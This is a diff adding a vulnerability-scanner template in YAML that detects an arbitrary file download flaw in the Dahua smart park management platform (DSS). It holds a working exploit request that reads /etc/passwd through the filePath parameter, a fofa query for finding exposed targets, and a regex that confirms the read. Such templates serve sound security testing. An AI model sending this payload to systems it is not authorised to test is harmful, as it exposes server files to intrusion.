@@ -1,0 +1,21 @@
+id: dahua-dss-attachment-downloadbyurlatt-fileread
+
+info:
+  name: 大华智慧园区管理平台 attachment_downloadByUrlAtt.action 任意文件下载漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    大华智慧园区管理平台存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
+    fofa: app="dahua-DSS"
+  tags: dahua,dss,fileread
+  created: 2024/04/04
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+    expression: |
+      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
